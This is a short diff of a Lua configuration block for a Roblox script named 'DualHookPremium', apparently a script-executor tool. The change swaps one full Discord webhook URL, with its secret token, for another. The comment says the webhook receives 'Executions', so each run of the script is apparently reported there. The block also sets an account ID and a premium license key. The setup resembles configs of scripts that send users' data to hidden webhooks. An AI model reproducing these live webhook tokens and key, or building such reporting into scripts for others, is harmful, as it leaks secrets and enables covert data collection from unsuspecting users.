@@ -27,7 +27,7 @@ _G.Tip5 = "" --// Gives You Tips On The UI
 --[[ DualHookPremium ]]--
 
 _G.DualHookPremiumID = 1962605868 --//DualHook Account ID
-_G.DualHookWebhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
+_G.DualHookWebhook = "https://discord.com/api/webhooks/1102951948921098280/PzEPoP6N0ywkdmoLA-ay7ZQZbxj7lFFkEk34wowPCHouapnmJA3yl9HFW6N9FsQjbbxH" --// Discord link Webhook For Executions
 _G.Key = "ARKHALIS-EYBLFUVBADWX" --// Arkhalis Premium Key
 
 --[[ Script ]]--
